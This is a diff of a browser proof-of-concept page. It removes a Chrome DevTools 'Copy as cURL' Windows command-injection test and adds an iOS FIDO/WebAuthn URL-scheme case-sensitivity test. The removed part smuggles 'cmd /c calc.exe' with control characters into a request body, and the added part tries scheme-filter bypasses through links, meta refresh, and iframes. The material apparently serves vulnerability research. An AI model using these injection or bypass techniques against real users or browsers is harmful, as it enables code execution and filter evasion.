@@ -1,37 +1,85 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Chrome DevTools Copy as cURL (cmd) – Windows PoC</title>
+<meta charset="utf-8">
+<title>iOS FIDO Scheme Case Sensitivity PoC</title>
+
+<!-- Meta refresh vector -->
+<meta http-equiv="refresh" content="9999">
+
+<style>
+  body { font-family: sans-serif; }
+  a { display: block; margin: 10px 0; }
+</style>
 </head>
+
 <body>
-  <h2>Copy as cURL (cmd) – Windows Command Injection PoC</h2>
-  <p>
-    Klik tombol di bawah, lalu buka DevTools → Network → request <code>copyme</code>.
-  </p>
+<h2>iOS FIDO / WebAuthn Scheme Handling PoC</h2>
 
-  <button onclick="run()">Send PoC Request</button>
+<p>
+Expected behavior:<br>
+- All FIDO / WebAuthn related schemes should be blocked from web context regardless of case.
+</p>
 
-  <script>
-    function run() {
-      // IMPORTANT:
-      // VT = 0x0b, FF = 0x0c (raw control characters)
-      const payload =
-        "A\ncmd /c calc.exe" +
-        String.fromCharCode(0x0b) +
-        "\ncmd /c calc.exe" +
-        String.fromCharCode(0x0c);
+<h3>1. Anchor tag (case variants)</h3>
+<a href="fido://">Blocked: fido://</a>
+<a href="FIDO://">TEST: FIDO:// (uppercase)</a>
+<a href="FiDo://">TEST: FiDo:// (mixed case)</a>
 
-      fetch("/copyme", {
-        method: "POST",
-        headers: {
-          "Content-Type": "text/plain"
-        },
-        body: payload
-      });
+<a href="webauthn://">Blocked: webauthn://</a>
+<a href="WEBAUTHN://">TEST: WEBAUTHN://</a>
 
-      alert("Request sent. Check DevTools → Network → copyme");
-    }
-  </script>
+<h3>2. JavaScript navigation</h3>
+<button onclick="location.href='FIDO://'">
+JS navigation → FIDO://
+</button>
+
+<button onclick="location.href='WEBAUTHN://'">
+JS navigation → WEBAUTHN://
+</button>
+
+<h3>3. Meta refresh injection</h3>
+<button onclick="
+  document.querySelector('meta[http-equiv]').content='0;url=FIDO://';
+">
+Meta refresh → FIDO://
+</button>
+
+<h3>4. Iframe injection</h3>
+<button onclick="
+  var i = document.createElement('iframe');
+  i.src = 'FIDO://';
+  document.body.appendChild(i);
+">
+Iframe → FIDO://
+</button>
+
+<h3>5. WebAuthn API trigger (control)</h3>
+<button onclick="triggerWebAuthn()">navigator.credentials.get()</button>
+
+<pre id="log"></pre>
+
+<script>
+function log(msg) {
+  document.getElementById('log').textContent += msg + "\n";
+}
+
+async function triggerWebAuthn() {
+  try {
+    await navigator.credentials.get({
+      publicKey: {
+        challenge: new Uint8Array(32),
+        allowCredentials: [],
+        timeout: 30000,
+        userVerification: "discouraged"
+      }
+    });
+    log("WebAuthn prompt triggered");
+  } catch (e) {
+    log("WebAuthn blocked: " + e);
+  }
+}
+</script>
+
 </body>
 </html>
